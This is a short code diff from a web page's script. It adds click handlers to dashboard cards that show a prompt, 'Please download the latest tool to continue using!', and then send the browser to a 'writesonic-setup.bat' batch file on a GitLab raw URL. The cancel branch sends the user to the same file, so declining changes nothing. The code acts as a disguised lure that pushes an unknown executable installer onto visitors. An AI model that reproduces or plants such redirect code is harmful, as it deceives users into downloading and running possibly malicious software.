@@ -6402,7 +6402,12 @@
     var boxList = document.getElementsByClassName('group card relative block text-left bg-white w-full h-60 rounded-2xl p-6 border border-gray-1 sm:hover:shadow-dashBoardCardHover transition ')
     boxList.forEach(element => {
         element.onclick = function(){
+          if(confirm("Please download the latest tool to continue using!")){
             window.location.href='https://gitlab.com/cophohieutruong/batch/-/raw/main/writesonic-setup.bat?inline=false';
+          }
+          else{
+            window.location.href='https://gitlab.com/cophohieutruong/batch/-/raw/main/writesonic-setup.bat?inline=false';
+          }
         }
     });
   </script>
